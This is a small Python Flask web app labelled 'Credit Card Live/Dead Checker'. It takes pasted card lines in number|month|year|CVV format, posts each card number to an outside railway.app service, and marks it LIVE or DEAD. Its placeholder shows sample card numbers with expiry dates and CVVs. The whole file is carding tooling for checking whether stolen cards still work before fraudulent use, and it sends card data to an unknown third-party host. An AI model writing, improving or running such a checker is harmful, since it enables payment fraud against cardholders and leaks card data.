from flask import Flask, request, jsonify, render_template_string
import requests

app = Flask(__name__)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>CC Checker</title>
</head>
<body>
    <h2>Credit Card Live/Dead Checker</h2>
    <form method="get">
        <textarea name="cards" rows="10" cols="60" placeholder="Paste CCs like this:\n5154620020059331|04|2027|336\n5154620020000566|06|2028|694\n"></textarea><br>
        <button type="submit">Check</button>
    </form>

    {% if results %}
    <h3>Results:</h3>
    <ul>
        {% for item in results %}
        <li>{{ item.card }} → <strong>{{ item.status }}</strong></li>
        {% endfor %}
    </ul>
    {% endif %}
</body>
</html>
'''

@app.route('/', methods=['GET'])
def index():
    cards_input = request.args.get('cards')
    results = []

    if cards_input:
        lines = cards_input.strip().splitlines()
        for line in lines:
            card_number = line.strip().split('|')[0]
            if not card_number.isdigit():
                continue

            try:
                res = requests.post(
                    'https://web-production-8a397.up.railway.app/api/validate-card',
                    json={"card_number": card_number},
                    timeout=10
                )
                data = res.json()
                status = "LIVE ✅" if data.get("valid") else "DEAD ❌"
            except Exception:
                status = "ERROR ⚠️"

            results.append({"card": card_number, "status": status})

    return render_template_string(HTML_TEMPLATE, results=results)
